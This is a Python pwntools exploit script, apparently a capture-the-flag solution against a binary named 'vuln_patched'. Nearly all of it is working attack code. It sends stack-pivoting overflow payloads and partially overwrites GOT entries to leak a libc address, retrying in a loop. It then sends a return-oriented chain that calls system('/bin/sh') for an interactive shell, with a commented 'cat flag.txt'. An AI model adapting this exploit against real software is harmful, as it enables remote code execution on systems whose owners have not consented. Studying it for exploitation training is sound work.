#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401178
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)
def s(dt): p.send(dt)

read = 0x401162
main = elf.sym.main+38
puts = libc.sym.puts
setvbuf_got = 0x404008
fake = 0x404040
stdin_got = 0x404030
bss = 0x404800
stdin = libc.sym._IO_2_1_stdin_

log.info(f'puts@libc: {hex(puts)}')

def leak_libc():
    s(flat(b'A'*0x40, fake + 0x40, read))

    pl = flat(
        b'A'*0x8,
        bss + 0x40,
        read,
        b'B'*0x18,
        bss + 0x50 + 0x40,
        read,
        setvbuf_got + 0x40,
        read
        )

    sleep(0.5)
    s(pl)

    sleep(0.5)
    s(p16(puts & 0xffff))

    pl = flat(
        b'A'*0x40,
        stdin_got + 0x40,
        read
        )
    s(pl)

    sleep(0.5)
    s(p8((stdin+8) & 0xff))

    pl = flat(
        b'A'*0x48,
        main
        )
    
    sleep(0.5)
    s(pl)

while True:
    try:
        p = conn()
        leak_libc()
        tmp = p.recv(6)
        print(tmp)
        if tmp and tmp != b'Fatal ':
            break
    except EOFError:
        log.failure("Failed")
        p.close()

# GDB()
libc.address = u64(tmp.ljust(8, b'\x00')) - 0x21ab23
log.info(f'libc_base: {hex(libc.address)}')

pl = flat(
    b'A'*0x48,
    libc.address + 0x000000000002a3e5 + 1,
    libc.address + 0x000000000002a3e5,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
    )

s(pl)
# p.sendline(b'cat flag.txt')
p.interactive()